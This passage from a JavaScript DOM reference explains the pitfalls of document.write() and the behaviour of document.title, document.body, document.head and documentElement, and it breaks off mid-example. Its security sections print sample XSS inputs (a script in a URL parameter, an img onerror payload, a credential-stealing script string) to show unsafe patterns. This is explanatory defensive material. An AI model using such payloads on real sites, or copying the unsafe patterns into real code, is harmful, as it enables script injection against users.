The browser may completely ignore the `document.write()` call for performance.

#### 3. XHTML/XML Documents Incompatibility

`document.write()` doesn't work in XHTML documents served with XML MIME types:

```html
<!-- Served as application/xhtml+xml -->
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<body>
  <script>
    document.write('<p>Test</p>'); // Throws exception
    // Error: document.write is not available in XML documents
  </script>
</body>
</html>
```

This limits code portability across document types.

#### 4. Unpredictable Async/Defer Behavior

Scripts with `async` or `defer` attributes load asynchronously, meaning they execute after parsing:

```html
<script async>
  document.write('<p>Async content</p>');
  // Clears entire document after load completes
</script>

<script defer>
  document.write('<p>Deferred content</p>');
  // Also clears entire document
</script>
```

Both scenarios result in document replacement rather than content insertion.

#### 5. Dynamic Script Injection Issues

Scripts added dynamically via DOM manipulation execute asynchronously:

```javascript
const script = document.createElement('script');
script.textContent = "document.write('<p>Dynamic</p>');";
document.body.appendChild(script);
// Executes after parsing, clears document
```

This makes `document.write()` unreliable in modern module-based architectures.

#### 6. Event Handler Context Problems

Calling `document.write()` from event handlers always clears the document:

```javascript
button.addEventListener('click', () => {
  document.write('<p>Clicked</p>');
  // Replaces entire page with just this paragraph
});
```

Users lose all existing content and functionality.

#### 7. Security Vulnerabilities

Direct string concatenation with user input creates XSS vulnerabilities:

```javascript
// Dangerous - XSS vulnerability
const userInput = getUrlParameter('name');
document.write('<p>Hello ' + userInput + '</p>');
// URL: ?name=<script>alert('XSS')</script>
```

The malicious script executes immediately in the document context.

#### 8. Maintenance and Debugging Difficulty

Code using `document.write()` is harder to reason about:

```javascript
document.write('<div>');
document.write('<p>Content</p>');
someFunction(); // What if this also uses document.write?
document.write('</div>');
```

Nested or distributed `document.write()` calls create fragile HTML construction that's difficult to track.

#### 9. No DOM Representation

Content written via `document.write()` doesn't return a DOM reference:

```javascript
document.write('<button id="myBtn">Click</button>');
// No reference to the created button
// Must query DOM separately
const btn = document.getElementById('myBtn');
```

This prevents immediate manipulation of created elements.

#### 10. Content Security Policy Violations

Strict CSP headers may block `document.write()`:

```
Content-Security-Policy: script-src 'self'
```

Dynamic code execution via `document.write()` containing `<script>` tags can violate CSP policies.

### Limited Legitimate Use Cases

**Third-party advertising scripts (legacy):**

```javascript
// Old ad serving pattern
document.write('<script src="ad-provider.com/ad.js"></script>');
```

Many older ad networks rely on this pattern, though modern alternatives exist.

**Inline script generation during parsing:**

```html
<script>
  if (oldBrowser) {
    document.write('<script src="polyfills.js"></script>');
  }
</script>
```

Even this has better alternatives using feature detection and dynamic import.

**Simple static site generation:** For purely static HTML generation tools that output complete HTML files, `document.write()` in inline scripts might work, but template systems are more maintainable.

### Modern Alternatives

#### DOM Manipulation Methods

```javascript
// Instead of:
document.write('<p>Hello World</p>');

// Use:
const p = document.createElement('p');
p.textContent = 'Hello World';
document.body.appendChild(p);
```

#### innerHTML for Complex Markup

```javascript
// Instead of:
document.write('<div><h2>Title</h2><p>Content</p></div>');

// Use:
const container = document.createElement('div');
container.innerHTML = '<h2>Title</h2><p>Content</p>';
document.body.appendChild(container);
```

#### insertAdjacentHTML for Precise Placement

```javascript
// Insert at specific position without replacing content
element.insertAdjacentHTML('beforeend', '<p>New content</p>');

// Positions: 'beforebegin', 'afterbegin', 'beforeend', 'afterend'
```

#### Template Strings with createElement

```javascript
function createCard(title, content) {
  const card = document.createElement('div');
  card.className = 'card';
  card.innerHTML = `
    <h3>${escapeHtml(title)}</h3>
    <p>${escapeHtml(content)}</p>
  `;
  return card;
}

document.body.appendChild(createCard('Title', 'Content'));
```

#### Template Elements

```html
<template id="cardTemplate">
  <div class="card">
    <h3></h3>
    <p></p>
  </div>
</template>

<script>
const template = document.getElementById('cardTemplate');
const clone = template.content.cloneNode(true);
clone.querySelector('h3').textContent = 'Title';
clone.querySelector('p').textContent = 'Content';
document.body.appendChild(clone);
</script>
```

#### Dynamic Script Loading

```javascript
// Instead of:
document.write('<script src="external.js"></script>');

// Use:
const script = document.createElement('script');
script.src = 'external.js';
script.async = true;
script.onload = () => {
  // Script loaded callback
};
document.head.appendChild(script);

// Or modern async import:
import('./module.js').then(module => {
  module.init();
});
```

#### Framework Declarative Rendering

```javascript
// React
function Component() {
  return <p>Hello World</p>;
}

// Vue
<template>
  <p>Hello World</p>
</template>

// Vanilla with Web Components
class MyElement extends HTMLElement {
  connectedCallback() {
    this.innerHTML = '<p>Hello World</p>';
  }
}
```

### Performance Comparison

**[Inference]** Based on browser parsing behavior:

```javascript
// document.write - blocks parser
console.time('write');
document.write('<div>'.repeat(1000) + '</div>'.repeat(1000));
console.timeEnd('write');
// Parser must process during script execution

// DOM methods - doesn't block parser
console.time('dom');
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  fragment.appendChild(div);
}
document.body.appendChild(fragment);
console.timeEnd('dom');
// Parser can continue, DOM updates batched
```

DOM methods allow progressive rendering and don't block the parser.

### Detection and Migration Strategies

**Detect usage in codebase:**

```bash
# Search for document.write usage
grep -r "document\.write" src/
```

**Polyfill for legacy code:**

```javascript
// Intercept and log instead of writing
const originalWrite = document.write;
document.write = function(...args) {
  console.warn('document.write called:', args);
  // Don't actually write, or use alternative
};
```

**Gradual migration pattern:**

```javascript
// Wrapper that uses modern API
function safeWrite(content, target = document.body) {
  const temp = document.createElement('div');
  temp.innerHTML = content;
  target.appendChild(temp.firstChild);
}

// Replace document.write calls progressively
safeWrite('<p>Content</p>');
```

### Browser Console Warnings

Modern browsers warn about problematic usage:

```
[Violation] Avoid using document.write().
https://developers.google.com/web/updates/2016/08/removing-document-write

document.write() call ignored due to intervention
```

These warnings indicate the browser may have blocked the operation.

### Related Methods

**document.writeln()** - Identical to `document.write()` but adds a newline:

```javascript
document.writeln('Line 1');
document.writeln('Line 2');
// Equivalent to:
document.write('Line 1\n');
document.write('Line 2\n');
```

Has the same problems and should be avoided.

**document.open()** - Explicitly opens a new document stream:

```javascript
document.open();
document.write('<html><body>New document</body></html>');
document.close();
```

Manually clears the document. Rarely needed in modern development.

**document.close()** - Closes the document stream:

```javascript
document.close();
// Tells browser parsing is complete
```

Usually called automatically by the browser.

### Summary of Avoidance Rationale

1. **Blocks parsing** - Prevents progressive rendering
2. **Browser intervention** - May be completely ignored on slow connections
3. **Clears document** - Unpredictable behavior after page load
4. **No async/defer support** - Incompatible with modern script loading
5. **Security risks** - Vulnerable to XSS without proper escaping
6. **No DOM references** - Can't manipulate created elements immediately
7. **CSP violations** - May be blocked by security policies
8. **XHTML incompatible** - Doesn't work in XML documents
9. **Maintenance burden** - Difficult to debug and refactor
10. **Better alternatives exist** - Modern DOM APIs are more predictable and performant

The modern web development consensus is to avoid `document.write()` entirely in favor of DOM manipulation methods, template systems, or framework-based rendering.

---

## document.title

### Core Mechanics

`document.title` is a string property representing the title displayed in the browser tab, window title bar, bookmarks, and history. It reads from and writes to the `<title>` element in the document's `<head>`.

```javascript
// Read current title
console.log(document.title); // "My Page"

// Set new title
document.title = "New Title"; // Updates <title> element and browser UI
```

Both getter and setter operations are synchronous and immediately reflected in the DOM and browser chrome.

### Relationship with \<title> Element

`document.title` provides direct access to the text content of `<title>`:

```javascript
// These are equivalent
document.title = "Example";

const titleEl = document.querySelector('title');
titleEl.textContent = "Example";
```

[Inference: document.title is a convenience accessor for the title element's text]

If no `<title>` element exists, reading returns empty string. Setting creates a `<title>` element if missing:

```javascript
// Document with no <title>
console.log(document.title); // ""

document.title = "Created";
// Now <title>Created</title> exists in <head>
```

### Multiple \<title> Elements

If multiple `<title>` elements exist (invalid HTML), `document.title` targets the first one:

```javascript
<head>
  <title>First</title>
  <title>Second</title>
</head>

console.log(document.title); // "First"

document.title = "Updated";
// Only first <title> changes to "Updated"
// Second remains "Second"
```

[Unverified: Exact behavior may vary slightly across browsers, but first-element priority is standard]

### Character Encoding and Special Characters

Supports Unicode characters directly:

```javascript
document.title = "Hello 世界 🌍";
// Displays correctly in browser UI if font supports glyphs
```

HTML entities are **not interpreted** when setting via JavaScript:

```javascript
document.title = "Test &amp; Example";
// Displays as: Test &amp; Example (literal ampersand-amp-semicolon)
// Not: Test & Example

// Correct approach for ampersand:
document.title = "Test & Example"; // Displays: Test & Example
```

When setting innerHTML on title element, entities are parsed:

```javascript
document.querySelector('title').innerHTML = "Test &amp; Example";
// Displays: Test & Example (entity converted)
```

### Whitespace Handling

Leading and trailing whitespace is preserved when setting:

```javascript
document.title = "  Spaced  ";
console.log(document.title); // "  Spaced  "
// Browser tab shows with spaces
```

Internal whitespace collapses in some contexts [Unverified: browser-specific rendering]:

```javascript
document.title = "Multiple    Spaces";
// May display with collapsed spaces in some browser UIs
```

Newlines and tabs are preserved but may render as spaces:

```javascript
document.title = "Line 1\nLine 2\tTabbed";
// Stored literally, but browser UI typically renders as single-line with spaces
```

### Maximum Length Constraints

[Unverified: Exact limits are browser and platform-specific]

Browsers impose practical limits on title length:

- **Chrome/Edge**: ~1000 characters before truncation in tab display
- **Firefox**: Similar length before tab truncation
- **Safari**: May truncate earlier in tab UI

No programmatic error occurs with long titles:

```javascript
document.title = "A".repeat(10000); // No error
// But browser UI will truncate display
```

Full title remains accessible via `document.title` even if UI truncates.

### Empty String Behavior

Setting empty string is valid:

```javascript
document.title = "";
// Browser tab shows: (empty) or fallback text
// <title></title> exists but empty
```

Browser fallback behavior when title is empty [Unverified: specific defaults vary]:

- May show document URL
- May show "Untitled"
- May show blank tab

### Title Changes and Browser History

Each `document.title` modification updates the history entry:

```javascript
history.pushState({}, "", "/page");
document.title = "New Title";
// Back button now shows "New Title" for this history entry
```

[Inference: Title changes affect current history state's display]

Changing title doesn't create new history entries—it updates the current entry's metadata:

```javascript
document.title = "Title 1";
document.title = "Title 2";
document.title = "Title 3";
// No new history entries created
// Only current page shows "Title 3"
```

### Single-Page Application Patterns

SPAs typically update title on route changes:

```javascript
function navigateTo(route, title) {
  history.pushState({}, "", route);
  document.title = title;
  // Render new content
}

// Common pattern with template
function setTitle(pageName) {
  document.title = `${pageName} | Site Name`;
}
```

Dynamic title updates improve:

- Back/forward navigation display
- Bookmark quality
- Browser history clarity
- Screen reader announcements [Inference]

### Security and XSS Considerations

`document.title` doesn't execute scripts:

```javascript
document.title = "<script>alert('XSS')</script>";
// Displays literally: <script>alert('XSS')</script>
// No script execution
```

HTML tags are not rendered:

```javascript
document.title = "<b>Bold</b> Text";
// Displays: <b>Bold</b> Text (tags as text)
```

Safe for user-generated content without sanitization [Inference: based on text-only nature]:

```javascript
document.title = userInput; // Safe from XSS
// Worst case: weird title display, no execution
```

### Document Type Variations

**HTML documents**: Standard behavior as described

**XML documents** [Unverified: XML-specific behavior]:

```javascript
// XML document
document.title = "XML Title";
// May not affect <title> element the same way
// Browser support varies
```

**SVG documents embedded as standalone**:

```javascript
// SVG <title> element has different purpose (accessibility)
// document.title interaction varies by context [Unverified]
```

**iframes**:

```javascript
// Each iframe has its own document.title
iframe.contentDocument.title = "Frame Title";
// Doesn't affect parent or browser tab display
// Only affects internal document representation
```

### Reading vs Setting Performance

[Inference: Based on typical DOM access patterns]

**Reading**: Fast, direct property access

- No layout calculation required
- Simple string return from cached value

**Setting**: Slightly more expensive

- Updates DOM tree (`<title>` element)
- Triggers browser chrome updates (tab display)
- May trigger accessibility tree updates
- No layout reflow (title not rendered in page)

Neither operation is expensive enough to cause performance concerns in normal usage.

### Notification Pattern with Title

Common technique for drawing attention:

```javascript
let original = document.title;
let blinkState = false;

const interval = setInterval(() => {
  document.title = blinkState ? original : "🔴 New Message!";
  blinkState = !blinkState;
}, 1000);

// Stop on focus
window.addEventListener('focus', () => {
  clearInterval(interval);
  document.title = original;
});
```

Creates flashing effect in browser tab to notify users of events in background tabs.

### Title and SEO Impact

Search engines use `document.title` for:

- Search result display titles
- Ranking signals (keyword relevance)
- Social media sharing metadata (fallback)

[Inference: Based on common SEO practices]

JavaScript-set titles are crawled by modern search engines:

```javascript
// Executes before crawlers finish rendering
document.title = "Dynamically Set Title";
// Google/Bing will index this title
```

However, initial HTML `<title>` is preferred for:

- Faster crawler discovery
- Guaranteed indexing before JavaScript execution
- Support for non-JavaScript crawlers

### Template Literal Patterns

Common construction patterns:

```javascript
// With optional sections
const category = "Tech";
const article = "JavaScript Tips";
document.title = `${article}${category ? ` - ${category}` : ""} | My Blog`;
// "JavaScript Tips - Tech | My Blog"

// Conditional formatting
const unread = 5;
document.title = unread > 0 ? `(${unread}) Messages` : "Messages";
// "(5) Messages"

// Localization helper
function setLocalizedTitle(key, params) {
  const template = i18n.get(key);
  document.title = template.replace(/{(\w+)}/g, (_, k) => params[k]);
}
```

### MutationObserver on Title

Can observe title changes via DOM mutations:

```javascript
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    if (mutation.target.nodeName === 'TITLE') {
      console.log('Title changed to:', document.title);
    }
  });
});

observer.observe(
  document.querySelector('title'),
  { childList: true, characterData: true, subtree: true }
);

document.title = "New"; // Triggers observer
```

Useful for tracking title changes made by third-party scripts or libraries.

### iframe Parent Access

Child iframe cannot directly modify parent title due to same-origin policy:

```javascript
// In iframe (different origin)
parent.document.title = "Attack"; // SecurityError
```

Same-origin iframes can modify parent:

```javascript
// Same-origin iframe
parent.document.title = "Changed from iframe"; // Works
```

[Inference: Standard cross-origin security applies]

### Default Title Fallback

When no title is set [Unverified: specific defaults vary by browser]:

**New blank document**:

```javascript
const newDoc = document.implementation.createHTMLDocument();
console.log(newDoc.title); // "" (empty string)
```

**data: URLs**:

```javascript
window.open('data:text/html,<h1>Test</h1>');
// Tab may show "data:text/html,..." or truncated version
```

**file:// URLs without title**:

```javascript
// Local file with no <title>
// Tab typically shows filename
```

### Screen Reader Announcements

[Inference: Accessibility behavior based on typical AT implementation]

When `document.title` changes, some screen readers announce the new title:

```javascript
document.title = "Page Loaded";
// May trigger screen reader announcement
```

Announcement behavior varies:

- Some SRs announce on every change
- Some only announce on page load
- Some require focus change to announce [Unverified]

For explicit announcements, use ARIA live regions instead:

```javascript
// More reliable for screen readers
liveRegion.textContent = "Content updated";
// Rather than relying on title change announcement
```

### Title Persistence Across Navigation

`document.title` is page-specific:

```javascript
document.title = "Page 1";
location.href = "/page2"; // Navigate away
// Title doesn't persist to new page
```

For maintaining title patterns across navigation, use:

- Server-side rendering with title in HTML
- SPA router with title management
- Meta-framework conventions (Next.js, Nuxt, etc.)

### documentElement.title vs document.title

They are **different properties**:

```javascript
console.log(document.title); // <title> element text
console.log(document.documentElement.title); // "" (empty)

document.documentElement.title = "Test";
// Sets title attribute on <html> element
// <html title="Test">
// Does NOT affect browser tab display
```

`documentElement.title` is a generic `title` attribute, not the document title.

### Getter/Setter Overriding

Can override with defineProperty:

```javascript
let customTitle = document.title;

Object.defineProperty(document, 'title', {
  get() { return `[Custom] ${customTitle}`; },
  set(value) { 
    customTitle = value;
    document.querySelector('title').textContent = value;
  }
});

document.title = "Test";
console.log(document.title); // "[Custom] Test"
```

[Inference: Overriding may break third-party code expecting standard behavior]

Practical use cases are limited—generally not recommended.

### Print Dialog Title

`document.title` determines the default filename in print/save dialogs:

```javascript
document.title = "Q4-Report-2024";
window.print();
// Print dialog suggests "Q4-Report-2024.pdf" as filename
```

[Unverified: Exact filename generation varies by browser and OS]

Sanitize titles when using for automated printing:

```javascript
// Remove problematic filename characters
document.title = title.replace(/[<>:"/\\|?*]/g, '-');
```

### Title in Browser Extensions

Extensions can read/modify titles across origins:

```javascript
// Content script with host permissions
chrome.tabs.executeScript({
  code: 'document.title = "Modified by Extension"'
});
```

[Inference: Subject to extension permissions model]

Useful for:

- Tab management tools
- Productivity trackers
- Custom tab naming
- Session managers

### Null and Undefined Coercion

Setting null or undefined converts to string:

```javascript
document.title = null;
console.log(document.title); // "null"

document.title = undefined;
console.log(document.title); // "undefined"
```

Always provide explicit strings:

```javascript
document.title = value || "Default Title";
document.title = value ?? "Default Title"; // Nullish coalescing preferred
```

### Document.write and Title

Using `document.write` after page load replaces entire document, including title:

```javascript
document.title = "Original";
document.write("<h1>New Content</h1>");
// Entire document replaced
// document.title now "" (no <title> in new content)
```

Avoid `document.write` post-load. For dynamic title updates, use direct assignment.

### CSP and Title Modification

Content Security Policy does **not restrict** `document.title` modification:

```javascript
// Even with strict CSP
document.title = "Any String";
// Works without restriction
```

[Inference: Title modification is not considered script execution]

CSP restrictions apply to:

- `<title>` element creation via innerHTML containing scripts
- Not to plain text title assignment

### Title in Worker Contexts

Web Workers and Service Workers have no `document` object:

```javascript
// Inside worker
console.log(document); // ReferenceError: document is not defined
// Cannot access or modify title from worker
```

To update title from worker, post message to main thread:

```javascript
// In worker
postMessage({ type: 'updateTitle', title: 'New Title' });

// In main thread
worker.onmessage = (e) => {
  if (e.data.type === 'updateTitle') {
    document.title = e.data.title;
  }
};
```

---

## document.body and document.head

### Definition and Access

`document.body` and `document.head` are properties that provide direct access to the `<body>` and `<head>` elements of an HTML document.

```javascript
const bodyElement = document.body;    // <body> element
const headElement = document.head;    // <head> element
```

These are convenience properties equivalent to:

```javascript
// Equivalent but more verbose
const bodyElement = document.querySelector('body');
const headElement = document.querySelector('head');
```

### Return Values and Availability

Both properties return `HTMLElement` objects (specifically `HTMLBodyElement` and `HTMLHeadElement`):

```javascript
console.log(document.body instanceof HTMLBodyElement);  // true
console.log(document.head instanceof HTMLHeadElement);  // true
console.log(document.body instanceof HTMLElement);      // true
console.log(document.head instanceof HTMLElement);      // true
```

If the elements don't exist in the document, the properties return `null`:

```javascript
// In a document without <body> or <head>
console.log(document.body); // null
console.log(document.head); // null
```

### Timing and Document Parsing

The availability of these properties depends on when the DOM parser encounters the elements:

```html
<!DOCTYPE html>
<html>
<head>
  <script>
    console.log(document.head); // Available - parser has reached <head>
    console.log(document.body); // null - <body> not yet parsed
  </script>
</head>
<body>
  <script>
    console.log(document.head); // Available
    console.log(document.body); // Available - parser has reached <body>
  </script>
</body>
</html>
```

For scripts in the `<head>`, `document.body` is `null` unless the script is deferred or runs after DOM parsing:

```javascript
// Safe: Waits for DOM
document.addEventListener('DOMContentLoaded', () => {
  console.log(document.body); // Always available
  console.log(document.head); // Always available
});
```

### Document.body Mutability

Unlike `document.head`, the `document.body` property can be reassigned:

```javascript
// Create a new body element
const newBody = document.createElement('body');
newBody.innerHTML = '<h1>New Body Content</h1>';

// Replace the existing body
document.body = newBody;
```

This replacement:

- Removes the old `<body>` element and all its children from the document
- Inserts the new `<body>` element
- Updates `document.body` to reference the new element
- Fires no special events for the replacement

```javascript
const oldBody = document.body;
document.body = document.createElement('body');

console.log(oldBody.parentNode); // null - detached from document
console.log(document.body === oldBody); // false
```

Attempting to set `document.body` to a non-body element throws an error:

```javascript
document.body = document.createElement('div'); 
// HierarchyRequestError: Failed to set the 'body' property on 'Document'
```

### Document.head Immutability

`document.head` is read-only and cannot be reassigned:

```javascript
const newHead = document.createElement('head');
document.head = newHead; // Silently fails or throws error (browser-dependent)

console.log(document.head === newHead); // false - assignment had no effect
```

To modify head content, manipulate its children rather than replacing the element:

```javascript
// Correct approach
document.head.innerHTML = ''; // Clear existing content
document.head.appendChild(newMetaTag);
```

### Common Operations

#### Adding Elements to Head

```javascript
// Adding meta tags
const metaTag = document.createElement('meta');
metaTag.name = 'description';
metaTag.content = 'Page description';
document.head.appendChild(metaTag);

// Adding stylesheets
const link = document.createElement('link');
link.rel = 'stylesheet';
link.href = 'styles.css';
document.head.appendChild(link);

// Adding inline styles
const style = document.createElement('style');
style.textContent = '.class { color: red; }';
document.head.appendChild(style);

// Adding scripts
const script = document.createElement('script');
script.src = 'app.js';
script.async = true;
document.head.appendChild(script);
```

#### Modifying Body Content

```javascript
// Replacing all body content
document.body.innerHTML = '<main><h1>New Content</h1></main>';

// Appending elements
const section = document.createElement('section');
section.textContent = 'New section';
document.body.appendChild(section);

// Prepending elements
const header = document.createElement('header');
document.body.prepend(header);

// Clearing body content
document.body.innerHTML = '';
// Or
while (document.body.firstChild) {
  document.body.removeChild(document.body.firstChild);
}
```

#### Styling and Classes

```javascript
// Adding classes
document.body.classList.add('dark-theme', 'loading');

// Setting inline styles
document.body.style.backgroundColor = '#f0f0f0';
document.body.style.margin = '0';

// Reading computed styles
const bodyStyles = getComputedStyle(document.body);
console.log(bodyStyles.backgroundColor);

// Data attributes
document.body.dataset.theme = 'dark';
document.body.dataset.userId = '12345';
```

### Body Attributes and Properties

The `<body>` element has several legacy event handler attributes that can be accessed via `document.body`:

```javascript
// Legacy event handlers (on body element)
document.body.onload = () => console.log('Page loaded');
document.body.onresize = () => console.log('Window resized');
document.body.onbeforeunload = (e) => {
  e.preventDefault();
  return 'Are you sure you want to leave?';
};
```

These are equivalent to window events:

```javascript
// Modern approach (preferred)
window.addEventListener('load', () => console.log('Page loaded'));
window.addEventListener('resize', () => console.log('Window resized'));
window.addEventListener('beforeunload', (e) => {
  e.preventDefault();
  return 'Are you sure?';
});
```

Body-specific attributes:

```javascript
// Background (deprecated, use CSS)
document.body.bgColor = '#ffffff'; // Deprecated
document.body.background = 'image.jpg'; // Deprecated

// Text colors (deprecated, use CSS)
document.body.text = '#000000'; // Deprecated
document.body.link = '#0000ff'; // Deprecated
```

These deprecated properties exist for legacy compatibility but should not be used in modern development.

### Relationship to Document Element

Both `document.body` and `document.head` are children of `document.documentElement` (the `<html>` element):

```javascript
console.log(document.body.parentElement === document.documentElement); // true
console.log(document.head.parentElement === document.documentElement); // true

// Sibling relationship
console.log(document.head.nextElementSibling === document.body); // true
console.log(document.body.previousElementSibling === document.head); // true

// Document hierarchy
console.log(document.documentElement.children);
// HTMLCollection [<head>, <body>]
```

### Frameset Documents

In documents using `<frameset>` instead of `<body>`, `document.body` returns the frameset element:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Frameset Document</title>
</head>
<frameset cols="50%,50%">
  <frame src="left.html">
  <frame src="right.html">
</frameset>
</html>
```

```javascript
// In frameset documents
console.log(document.body instanceof HTMLFrameSetElement); // true
console.log(document.body instanceof HTMLBodyElement); // false
```

Setting `document.body` to a frameset element is valid:

```javascript
const frameset = document.createElement('frameset');
document.body = frameset; // Valid - replaces body with frameset
```

### Performance Considerations

Direct property access is faster than querying:

```javascript
// Faster
const body = document.body;

// Slower (involves selector parsing and DOM traversal)
const body = document.querySelector('body');
const body = document.getElementsByTagName('body')[0];
```

However, the performance difference is negligible in most applications. The primary benefit is convenience and readability.

Caching references when making multiple accesses:

```javascript
// Less efficient (multiple property accesses)
document.body.style.margin = '0';
document.body.style.padding = '0';
document.body.classList.add('ready');

// More efficient (single property access, cached reference)
const body = document.body;
body.style.margin = '0';
body.style.padding = '0';
body.classList.add('ready');
```

### Document Loading States

Checking if body is available is a common pattern for determining document state:

```javascript
function executeWhenBodyReady(callback) {
  if (document.body) {
    callback();
  } else {
    document.addEventListener('DOMContentLoaded', callback);
  }
}

executeWhenBodyReady(() => {
  console.log('Body is available');
  document.body.classList.add('initialized');
});
```

Alternative using mutation observers:

```javascript
if (!document.body) {
  const observer = new MutationObserver((mutations, obs) => {
    if (document.body) {
      console.log('Body element created');
      obs.disconnect();
      initializeApp();
    }
  });
  
  observer.observe(document.documentElement, { childList: true });
} else {
  initializeApp();
}
```

### Cross-Document Scenarios

When working with iframes or multiple documents:

```javascript
// Parent document
console.log(document.body); // Parent's body

// Iframe document
const iframe = document.querySelector('iframe');
const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

console.log(iframeDoc.body); // Iframe's body
console.log(iframeDoc.head); // Iframe's head

// They are different elements
console.log(document.body === iframeDoc.body); // false
```

Cross-origin iframes block access to their document:

```javascript
// Cross-origin iframe
const iframe = document.querySelector('iframe');
try {
  console.log(iframe.contentDocument.body);
} catch (e) {
  console.error('SecurityError: Blocked access to cross-origin iframe');
}
```

### Special Document Types

#### XML Documents

In XML documents, `document.body` and `document.head` return `null` since these are HTML-specific elements:

```javascript
// In an XML document
console.log(document.body); // null
console.log(document.head); // null

// Use documentElement instead
console.log(document.documentElement); // Root XML element
```

#### SVG Documents

Similarly, SVG documents don't have body or head elements:

```javascript
// In an SVG document
console.log(document.body); // null
console.log(document.head); // null
console.log(document.documentElement); // <svg> element
```

#### HTML Fragments

Document fragments created with `DOMParser` don't have these properties:

```javascript
const parser = new DOMParser();
const doc = parser.parseFromString('<html><body>Test</body></html>', 'text/html');

console.log(doc.body); // Available - <body> element
console.log(doc.head); // Available - <head> element (created automatically)

// Fragment without HTML structure
const fragment = document.createDocumentFragment();
console.log(fragment.body); // undefined (fragments don't have body property)
```

### Memory and Garbage Collection

References to `document.body` or `document.head` don't prevent garbage collection of removed children:

```javascript
const div = document.createElement('div');
document.body.appendChild(div);

// Reference to body doesn't keep div alive after removal
document.body.removeChild(div);
// div can be garbage collected when no other references exist
```

However, the body element itself cannot be garbage collected while the document exists:

```javascript
let bodyRef = document.body;
bodyRef = null; // Doesn't matter - document maintains the reference
console.log(document.body); // Still available
```

### Creating Documents Programmatically

When creating new documents, head and body may need explicit creation:

```javascript
const newDoc = document.implementation.createHTMLDocument('New Document');

console.log(newDoc.head); // Auto-created <head>
console.log(newDoc.body); // Auto-created <body>
console.log(newDoc.title); // 'New Document'

// Minimal document without automatic elements
const minimalDoc = document.implementation.createDocument(
  'http://www.w3.org/1999/xhtml',
  'html',
  null
);

console.log(minimalDoc.body); // null - must be created manually
console.log(minimalDoc.head); // null - must be created manually
```

### Security Considerations

Both properties can be targets for XSS attacks if user content is inserted unsafely:

```javascript
// Dangerous: XSS vulnerability
const userInput = '<img src=x onerror=alert("XSS")>';
document.body.innerHTML = userInput; // Executes malicious script

// Safer: Text content only
document.body.textContent = userInput; // Renders as text, no execution

// Safer: Sanitize HTML
const sanitized = DOMPurify.sanitize(userInput);
document.body.innerHTML = sanitized;

// Safest: Use DOM methods
const textNode = document.createTextNode(userInput);
document.body.appendChild(textNode);
```

Modifying `document.head` with untrusted content is particularly dangerous:

```javascript
// Extremely dangerous
const maliciousScript = '<script>stealCredentials()</script>';
document.head.innerHTML += maliciousScript; // Executes immediately
```

### Browser Compatibility

`document.body` has been supported since early browser versions (IE4+, all modern browsers).

`document.head` was standardized in HTML5:

- Modern browsers: Full support (Chrome, Firefox, Safari, Edge)
- IE8 and below: `document.head` returns `undefined`

Polyfill for older browsers:

```javascript
// Legacy support for document.head
if (!document.head) {
  document.head = document.getElementsByTagName('head')[0];
}
```

Modern development typically doesn't require this polyfill as IE8 is no longer relevant.

---

## document.documentElement

### Definition and Purpose

`document.documentElement` is a read-only property that returns the root element of the document. For HTML documents, this is always the `<html>` element. For XML documents, it returns the root element of that particular XML structure.

### Return Value

The property returns an `Element` object representing the document's root element. In HTML documents, this is specifically an `HTMLHtmlElement` instance.

```javascript
const rootElement = document.documentElement;
console.log(rootElement.nodeName); // "HTML"
console.log(rootElement.tagName); // "HTML"
console.log(rootElement instanceof HTMLHtmlElement); // true
```

### Difference from document.body and document.head

**document.documentElement:** Returns the `<html>` element (the root).

**document.body:** Returns the `<body>` element (child of `<html>`).

**document.head:** Returns the `<head>` element (child of `<html>`).

```javascript
// Hierarchy
document.documentElement // <html>
├── document.head        // <head>
└── document.body        // <body>
```

### Accessing document.documentElement

The property is available immediately, even before the DOM is fully loaded, as the `<html>` element is created during initial document parsing:

```javascript
// Available immediately in script tags
console.log(document.documentElement); // <html>...</html>

// Also available before DOMContentLoaded
document.addEventListener('DOMContentLoaded', () => {
  console.log(document.documentElement); // Same element
});
```

### Common Use Cases

**Viewport dimensions:** Accessing the viewport or document dimensions:

```javascript
// Document scroll dimensions
const scrollHeight = document.documentElement.scrollHeight;
const scrollWidth = document.documentElement.scrollWidth;

// Client dimensions (viewport size)
const viewportHeight = document.documentElement.clientHeight;
const viewportWidth = document.documentElement.clientWidth;

// Current scroll position
const scrollTop = document.documentElement.scrollTop;
const scrollLeft = document.documentElement.scrollLeft;
```

**Scroll position manipulation:**

```javascript
// Get current scroll position
const currentScroll = document.documentElement.scrollTop;

// Set scroll position
document.documentElement.scrollTop = 0; // Scroll to top
document.documentElement.scrollTop = 500; // Scroll to 500px from top

// Smooth scroll to top
document.documentElement.scrollTo({
  top: 0,
  behavior: 'smooth'
});
```

**CSS class manipulation for global styles:**

```javascript
// Add theme class
document.documentElement.classList.add('dark-theme');

// Toggle theme
document.documentElement.classList.toggle('dark-theme');

// Remove theme
document.documentElement.classList.remove('dark-theme');

// Check for class
if (document.documentElement.classList.contains('dark-theme')) {
  console.log('Dark theme is active');
}
```

**CSS custom properties (variables):**

```javascript
// Set CSS variables on root
document.documentElement.style.setProperty('--primary-color', '#007bff');
document.documentElement.style.setProperty('--font-size', '16px');

// Get CSS variable value
const primaryColor = getComputedStyle(document.documentElement)
  .getPropertyValue('--primary-color');

// Remove CSS variable
document.documentElement.style.removeProperty('--primary-color');
```

**Attributes on the html element:**

```javascript
// Set lang attribute
document.documentElement.lang = 'en-US';

// Set dir attribute for text direction
document.documentElement.dir = 'rtl'; // right-to-left

// Set custom data attributes
document.documentElement.dataset.theme = 'dark';
document.documentElement.setAttribute('data-loaded', 'true');

// Get attribute values
const lang = document.documentElement.getAttribute('lang');
```

### Viewport and Scroll Measurements

**clientHeight and clientWidth:** Return the inner height and width of the root element, including padding but excluding borders, margins, and scrollbars. These values represent the viewport dimensions in most cases.

```javascript
const viewportHeight = document.documentElement.clientHeight;
const viewportWidth = document.documentElement.clientWidth;

// Viewport aspect ratio
const aspectRatio = viewportWidth / viewportHeight;
```

**scrollHeight and scrollWidth:** Return the total scrollable height and width of the document, including content that extends beyond the visible viewport.

```javascript
const totalHeight = document.documentElement.scrollHeight;
const totalWidth = document.documentElement.scrollWidth;

// Check if document is scrollable
const isVerticallyScrollable = 
  document.documentElement.scrollHeight > document.documentElement.clientHeight;

const isHorizontallyScrollable = 
